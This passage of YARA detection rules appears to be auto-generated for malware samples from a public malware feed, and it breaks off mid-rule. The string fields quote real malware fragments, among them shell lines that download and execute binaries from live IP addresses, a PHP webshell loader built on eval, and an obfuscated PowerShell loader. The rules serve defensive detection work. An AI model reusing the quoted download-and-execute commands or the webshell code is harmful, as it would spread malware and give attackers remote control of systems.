      $s12 = "W#j<Mc" fullword ascii
      $s13 = "C#g\\e\\." fullword ascii
      $s14 = "R-'\"Nf" fullword ascii
      $s15 = "&p[FZL" fullword ascii
      $s16 = "Ep~yy)" fullword ascii
      $s17 = "||CbeW" fullword ascii
      $s18 = "I[32\\^" fullword ascii
      $s19 = "Gq<^lg" fullword ascii
      $s20 = "j3A6?x" fullword ascii
   condition:
      uint16(0) == 0x88e8 and filesize < 200KB and
      8 of them
}

rule sig_73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d {
   meta:
      description = "evidences - file 73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s5 = "AAAAAAAAAEAAAAA" ascii /* base64 encoded string '       @   ' */
      $s6 = "AEAAAAAAAAA" ascii /* base64 encoded string ' @      ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                            ' */
      $s8 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s9 = "DAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '            ' */
      $s10 = "AEAAAEBDAEAAA" ascii /* base64 encoded string ' @  @C @ ' */
      $s11 = "AAAAAFAAAA" ascii /* base64 encoded string '    P  ' */
      $s12 = "AQjN05WSVVGdpJ3VAMjdAMzXf9mP8AgM2BgMlRXYjlmZpRnclNUOwUDWAITYAIzM05WSwF2dTBgMzQnbJ9GVAIzM05WSkFWZSBgMzQnbJV1bUBgMzIXZzVHAyMjbpdlL" ascii
      $s13 = "GNXQfRXZzBAdh9GbGNXQfRXZnBAdh9GbGVGdpJ3VAQXYtJ3bmBAdh1mcvZUZnFWbJBAdhNmbvNEAzlXZLBwc3Vmb2EDAzVncpZXa05WQAMHdz9GSAMHdzlGeFBwc0J3b" ascii
      $s14 = "DlXYyJXQkRWQyVmbulEAkxWaoNEch1EZkFkcl5mbJBAZsVWaGdmbpt2YhJ0XftmP05WZpx2QwNGV8AAZsVWaGdmbpt2YhJ0XftmP05WZpx2QsN3U8AAZsVWaGdmbpt2Y" ascii
      $s15 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s16 = "f50TJRVVDVEWFBARJRXYtJ3bG9FdldGAEl0av9GafBARJdFSAQUSP9GVl1WYOBXYNBARFJVSVFVRS9VWBxEUTlERfNVRAQURSlUVRVkUf1URUNVWT91UFBwQHBgQ4UzQ" ascii
      $s17 = "llmRn5WarNWYC91Xr5zZulGU8AAZsVWaGdmbpt2YhJ0XftmPlpXaTJXZkFWZIxDAkxWZpZ0Zul2ajFmQf91a+UmdpxWQwVWZLxDAkxWZpZ0Zul2ajFmQf91a+QWZ0NWZ" ascii
      $s18 = "BAAAAAAAAAAAAAAAAAAA8AAA" ascii /* base64 encoded string '              <  ' */
      $s19 = "6AAAAAAAAA" ascii /* reversed goodware string 'AAAAAAAAA6' */
      $s20 = "hJ0XftmP0V2cmZ2T8AAZsVWaGdmbpt2YhJ0XftmPyVmZmVnQ8AAZsVWaGdmbpt2YhJ0XftmPsFmdyVGdulEPAQGbllmRn5WarNWYC91Xr5zZu9GUlRXY2lGdjFEPAQGb" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c {
   meta:
      description = "evidences - file 8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s5 = "bM9B+AgBbMNGKBgBg4jD1BgBZo2CGBgETECABAgEZoGAWBgEOsyHaDgBDMIAhBgBAs4GdAgCTEyESCgBOsCI5DgBTEiCFAgBOIIHhDgDOIYFSBgDTEyE7CgBTECE7CgB" ascii
      $s6 = "AAAAAAAAAEAAAAA" ascii /* base64 encoded string '       @   ' */
      $s7 = "AEAAAAAAAAA" ascii /* base64 encoded string ' @      ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                            ' */
      $s9 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s10 = "AAAAAFAAAA" ascii /* base64 encoded string '    P  ' */
      $s11 = "AQjN05WSVVGdpJ3VAMjdAMzXf9mP8AgM2BgMlRXYjlmZpRnclNUOwUDWAITYAIzM05WSwF2dTBgMzQnbJ9GVAIzM05WSkFWZSBgMzQnbJV1bUBgMzIXZzVHAyMjbpdlL" ascii
      $s12 = "TESCxDgCTECE4BgCOsCE6DgBTESDAAgBUE3G8BgCZoOFqCgCdo4H3BgCi8FEWDgCcooERCgCTEyBKBgBTEyGmDgBdo4GYBgCdo4G+CgCTEyEzBgBTEiFaBgBTEyDWBgB" ascii
      $s13 = "0B3T0lGbwN1Zulmc0NFAz52bpR3YlxGbvNkLtVGdzl3UAMnbpdWdsBFAz5WahRnbvNEAz5GRAMXby9mRuM3dvRmbpdlLtVGdzl3UAMHbv9GVzVGd5JEAzx2bvRVZ0lmc" ascii
      $s14 = "Zo2FQAgEWE/FYAgIWEvGJDgIWEfFEDgITEyBYCgBTECGeCgBTEyEzDgBUg5FYAgBUgpG8CgBTEiCJBgBUgZIvDgBOsyCZAgBDMIAIBgBWg0B/AgEAAAGTCwUAsYBwDgB" ascii
      $s15 = "AM3ZyFEduVmdFdmbpRmbF52bpN3clNFAzdmbpRHdlNVZ6lGbhlGdp5WSAM3Zulmc0NFAzdWYsZ0dAM3ZhxmRzVGAzdWYsZkclRmbpJEcyFGaTNEAzdWYsZ0bm5WS05WZ" ascii
      $s16 = "lZXRtVGdzl3UAMHduVWb1dmcB9FdlNHAzRXZrN2bT5Cdl5kLtVGdzl3UAM3clJHct92YlREAzNXZyBXbvNEAzNXZyRGZBBVSAM3clN2byBFduVmcyV3Q0V2RAM3clN2b" ascii
      $s17 = "XBwcs92bURWYlJFAzx2bj9GdvJHUsN3UAMHbhVXcFBwcsFWa05WZkVmcD9FdlNHAzxWYpRnblRWZyNUSAM3ajFGUAMXazlHbh5WQpRnbB5WdSBwcpNXesFmbB9Va05WQ" ascii
      $s18 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s19 = "f50TJRVVDVEWFBARJRXYtJ3bG9FdldGAEl0av9GafBARJdFSAQUSP9GVl1WYOBXYNBARFJVSVFVRS9VWBxEUTlERfNVRAQURSlUVRVkUf1URUNVWT91UFBwQHBgQ4UzQ" ascii
      $s20 = "BAAAAAAAAAAAAAAAAAAA8AAA" ascii /* base64 encoded string '              <  ' */
   condition:
      uint16(0) == 0x4141 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c {
   meta:
      description = "evidences - file c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c"
   strings:
      $x1 = "=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s5 = "bAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'l              ' */
      $s6 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s7 = "BAABEAAAAAAAA" ascii /* base64 encoded string '  D      ' */
      $s8 = "AAAAAAAAAAAAB" ascii /* base64 encoded string '         ' */
      $s9 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s10 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s11 = "DAAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s12 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s13 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s14 = "AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @                     ' */
      $s15 = "CQAgAAAAEwTEGMQCGIQCJkQADAgB8EBPREAAGIAEYIgAAYACpIBGIMAAHUkEGMACB0jE5IRAAYgOKUdE/91PwiACOEAAEATEQIQAAYQNRYwAwEhBDUiEYEAIFwRMSgBG" ascii
      $s16 = "Cc7E4CoVCcbAOAoVCc7FACoVCc7DbBoVCcbIxBoVCcrFIAoVCcrErBoVCcbFPBoVAozATZgBCsbIsBQABo8EVDQABsuH/DQACcrCJAQAAcTDLAQAAIRCYBQAAIRCICQA" ascii
      $s17 = "MYIAGQRnM0GAGQRnMEKAGQRnLoPAGQRnMkBAGQRnLIJAGAAAZMJA/hB9LoGAGkxcMoLAGkxcM0EAGIg/S0NAGsB3HgDAGsB3Y8EAGASYOoHAGkxcLAEASMhJAEAASkxc" ascii
      $s18 = "h1WS0V2RAMnchh2QfRXZnBwcwBwcu9Wa0B3T0lGbwN1Zulmc0NFAz52bpR3YlxGbvNkLtVGdzl3UAMnbpdWdsBFAz5WahRnbvNEAz5GRAMXby9mRuM3dvRmbpdlLtVGd" ascii
      $s19 = "TBgMzQnbJ9GVAIzM05WSkFWZSBgMzQnbJV1bUBgMzIXZzVHAyMjbpdlL0Z2bz9mcjlWTAIzM9UmepNVZwlHV0lmbJlXYyJXQjlGdhR3Uf9FAxYHAxEGAxAGdzlGTAEDY" ascii
      $s20 = "0NXa4VEAzRncvBFAzRnblZXRtVGdzl3UAMHduVWb1dmcB9FdlNHAzRXZrN2bT5Cdl5kLtVGdzl3UAM3clJHct92YlREAzNXZyBXbvNEAzNXZyRGZBBVSAM3clN2byBFd" ascii
   condition:
      uint16(0) == 0x413d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule ea29e601447378337ee7aa6eef7018853cbce94c0ecac6acba7253a2d866d058 {
   meta:
      description = "evidences - file ea29e601447378337ee7aa6eef7018853cbce94c0ecac6acba7253a2d866d058.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "ea29e601447378337ee7aa6eef7018853cbce94c0ecac6acba7253a2d866d058"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8gKPIyDb8wEPswDC7w/OcvDs7Q5O0tDV7AzOQoD76wsOsqDj6wmOEpDK" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                               ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                     ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                    ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                            ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                    ' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                           ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                               ' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                       ' */
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                     ' */
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                            ' */
      $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                        ' */
      $s18 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                       ' */
      $s19 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                     ' */
   condition:
      uint16(0) == 0x4141 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_7406502260456952a47a196329b63e2081d759a2ddb5f782c580bda542df7995 {
   meta:
      description = "evidences - file 7406502260456952a47a196329b63e2081d759a2ddb5f782c580bda542df7995.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "7406502260456952a47a196329b63e2081d759a2ddb5f782c580bda542df7995"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f; " ascii
      $s2 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f; " ascii
      $s3 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; > " ascii
      $s4 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; > " ascii
      $s5 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; > " ascii
      $s6 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; > " ascii
      $s7 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; > " ascii
      $s8 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; > " ascii
      $s9 = "# ; rm -rf .f;" fullword ascii
      $s10 = ".f; # ; rm -rf .f;" fullword ascii
      $s11 = "./the_rizzler" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      8 of them
}

rule sig_9b14e2f6965e2cbedf03d8060152b068146c449f82c6d4efc7480621073f1fe1 {
   meta:
      description = "evidences - file 9b14e2f6965e2cbedf03d8060152b068146c449f82c6d4efc7480621073f1fe1.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "9b14e2f6965e2cbedf03d8060152b068146c449f82c6d4efc7480621073f1fe1"
   strings:
      $s1 = ":nN(@pP" fullword ascii
   condition:
      uint16(0) == 0xa80d and filesize < 4KB and
      all of them
}

rule sig_9ef8e88c4fcaf05c12c2d04a71fffe74a35791d5303f8ba7b2cdac2ee84b3bd8 {
   meta:
      description = "evidences - file 9ef8e88c4fcaf05c12c2d04a71fffe74a35791d5303f8ba7b2cdac2ee84b3bd8.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "9ef8e88c4fcaf05c12c2d04a71fffe74a35791d5303f8ba7b2cdac2ee84b3bd8"
   strings:
      $s1 = "[System.Text.Encoding]::ascii.((-join (@((-8046+8117),(66761/661),(4122-4006),(7725-7642),(-8772+(11137-2249)),(7952-(29721696/3" ascii
      $s2 = "YQCwwVEBJnlbjI9gZ14pZ2dsNvOycmspyX3NLMgnE2VOaRh+tCYFJOofj6bEcLb+Fxw++nAtYinjTMIckA/xVlU7xosqAwEPJkd4M9wCf0ojN/PkQRIPP2P8l8DmP7lD" ascii
      $s3 = "00000156000001470000015200000145\".Substring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 42)}))(($_ * (4136-4134)" ascii
      $s4 = "w32qWc5CloqBd6uxYooInoH8HUf+GhGFmo2Vi9t/vr4YSlQVk5W59S9FrAKbnl2tz1Krk28m3wSfiwUVcqapqR8nzkeYvvvlW4mBtyNlipSQSEfRtQqLn9s/rpZ9eNQV" ascii
      $s5 = "JPWvAtMptNLa6v46C8wi8Y7Ut5WEuNQRm521jYu/2v9c+BcRFqmXq+C/di2y22XKGWsPklRN69s5Y8OEJSgXRL7KGSt4DMKvKou08DaIGuBoV35VE+6bqbM/ncIa535b" ascii
      $s6 = " 1 + 1))), ([math]::Pow(2, 1 + 1))) - 66)})).(([ChAR[]]@((8617-8546),(258863/2563),(547056/4716),(-2003+2087),(-5150+5271),(1381" ascii
      $s7 = "[math]::Pow(2, 2 + 2))) - 60)})).(([chaR[]]@((296227/(899388/(-5564+(16023-(13628-3421))))),(787295/(15215-(24233720/(11384-8118" ascii
      $s8 = "$uansht=$executioncontext;$beenanbeatedononorinon = ([chaR[]]@((-8626+(2777+5902)),(-6812+6864),(6511-(-3034+9488)),(-3046+3096)" ascii
      $s9 = "6786),(10300-10190),(-2278+(681+(5117-(10734-7317))))) -join ''))(($_ * (17220/(12843-(321708/(671688/(45109152/5104)))))), (124" ascii
      $s10 = "$uansht=$executioncontext;$beenanbeatedononorinon = ([chaR[]]@((-8626+(2777+5902)),(-6812+6864),(6511-(-3034+9488)),(-3046+3096)" ascii
      $s11 = "wtY3vZ4nMNrIQRNSEjjFLcUOCpEtDizWc/R2AjazsBhJJpcZVsMQZS5kPanG7vgsbsNpBwqIoytvMURjIZBNTnQzPos9+wKEvZDZiyUV+qsxDCI+1u5sEjMKhtJ6wIrT" ascii
      $s12 = "YeQlk6PjFVPFJaJON4h4r1f9SN7SnqoKEZpikgUu7Fe5x3bGazSZuQWMEWU+Ylxaw/ibQn4oiB281YSqLKBjCtxVQiIwMq4ombz63wP1cQOLeOuDxTPf2HK7FhM4SEay" ascii
      $s13 = "4KB78/QeB1nYe5Quv2HECUlg4j1z2MKpBeJ4oyE3sG8Yud2JuHXx28nLXdhHfaf0TkvZoTl/gAUyAropV/+N16o0bH1MzQRPILZdYSKIFriq9qUrNS6JlsdvsmK3tLQC" ascii
      $s14 = "AEgOVdPx87DSpp1LGFp1pZho/rTabUZXJn5z6VIoNsJBPOlBazhRDjY+WyvAlFwg/X17kw+/x3y7tzc+hs1tgoO8HfKFJOg1zqu9UJLnxAwEVO4HBmG5RN6iyae+1fJN" ascii
      $s15 = "OI4vEcWV0gaZlYqFj6S/jo9Gjpr/j9c3Nje0xliqoHVl0UAA3zCb1pmpA+MeD2V0sMI8QIOxGFOfvj+9vJJTauZxtvDqzzRrh0RbkS7TsnjvOAru9rbc5B3uHXnkZQsU" ascii
      $s16 = "s90CbEq/rZ2TM7O3w4eEj8NvTmafy0MU34OxxNs8paJFLFA7RaEmiZPsjbgLCripWJfk6yMLGgk3NNG9YV41o95DH3gWjYRj4UD0rhmkK/oHOg0VoJlkQ3lq0M5+gGLr" ascii
      $s17 = "3flO8CxSsR+4T1G5wfIun933UTu7HfTvsxeRMBHrXh8EGFOShaDvmcjPgbGZ8JOx8ErMXoxAmZKi9BMB0suJ2fenr6BUnIXFw8oSxRoj8s2FPa60C8Zvc+5OTE1Futzb" ascii
      $s18 = "SsV0f8z3uU9WJO43n4KVApv7I6iYOl146IqBv1ktGEwNjLqigFauuDZaTHUiIhX9INbNxO+QYHSH547Pn/u22QnQaI/wMuCesT3BPfVqNo6K2Pc734RrxBF4TmK6yEJI" ascii
      $s19 = "6bBgxAEZHQ2hOHaA00zLkZzzojdUWoqDK4Lq2U2HF8f7LxF83mWgVaSuTFmIQ3LgESFmDQBmBqPyC4UdSjfW9+TUQtGf7IbEEc4CNQaDpEQY/BuDwTPZTlTq+Pyo4QI5" ascii
      $s20 = "odNS/kaqKHeeSL5obYXGLwVFbNZoTaTpxLrWrxbIwPBMZEGi6j82zP+VS/mC2NqLvd5D4ZPVBrd82RYekpcUOdw7MpqTSKEmKR44q16RtNFuTzDElmd6EQNusy4TAYAU" ascii
   condition:
      uint16(0) == 0x7524 and filesize < 60KB and
      8 of them
}

rule f33c56aff31432f0ce1a9c3904a7c75852dc86d6721043078a06834d37903241 {
   meta:
      description = "evidences - file f33c56aff31432f0ce1a9c3904a7c75852dc86d6721043078a06834d37903241.php"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "f33c56aff31432f0ce1a9c3904a7c75852dc86d6721043078a06834d37903241"
   strings:
      $s1 = "            $_SESSION[$payloadName] = encryption($data,1, $key);" fullword ascii
      $s2 = "            $payload = encryption($_SESSION[$payloadName],0, $key);" fullword ascii
      $s3 = "        $payload = encryption($_SESSION[$payloadName],0, $key);" fullword ascii
      $s4 = "        if (strpos($payload, \"getBasicsInfo\") === false) {" fullword ascii
      $s5 = "$payloadName = 'payload';" fullword ascii
      $s6 = "function encryption($data, $mode,$key) {" fullword ascii
      $s7 = "if (isset($_POST[$pass])) {" fullword ascii
      $s8 = "    if (isset($_SESSION[$payloadName])) {" fullword ascii
      $s9 = "        echo base64_encode(encryption(@run($data),1,$key));" fullword ascii
      $s10 = "@error_reporting(0);" fullword ascii
      $s11 = "    $data = base64_decode($_POST[$pass]);" fullword ascii
      $s12 = "        eval($payload);" fullword ascii
      $s13 = "        $data = encryption($data,0, $key);" fullword ascii
      $s14 = "            $result = @openssl_encrypt($data, \"AES-128-ECB\", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING,$iv);" fullword ascii
      $s15 = "            $result = @mcrypt_encrypt(\"rijndael-128\", $key, $data, \"ecb\", $iv);" fullword ascii
      $s16 = "            $index = $i - 1;" fullword ascii
      $s17 = "        if (strspn($result, chr($pad), strlen($result) - $pad) != $pad) return false;" fullword ascii
      $s18 = "            $pad = $blocksize - (strlen($data) % $blocksize);" fullword ascii
      $s19 = "        strlen($result) - 1" fullword ascii
      $s20 = "    if (function_exists(\"openssl_encrypt\") && $mode<2) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule d195ef4a8ea5be63ebce6afe960a6345e97b8a692f845a72b3fcc54d2f55bb70 {
   meta:
      description = "evidences - file d195ef4a8ea5be63ebce6afe960a6345e97b8a692f845a72b3fcc54d2f55bb70.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "d195ef4a8ea5be63ebce6afe960a6345e97b8a692f845a72b3fcc54d2f55bb70"
   strings:
      $s1 = "wget http://$server_ip/$arch -O -> dvrHelper" fullword ascii
      $s2 = "dirs=\"top var/tmp tmp/tmpfs dev/shm var/run\"" fullword ascii
      $s3 = "server_ip=\"185.142.53.43\"" fullword ascii
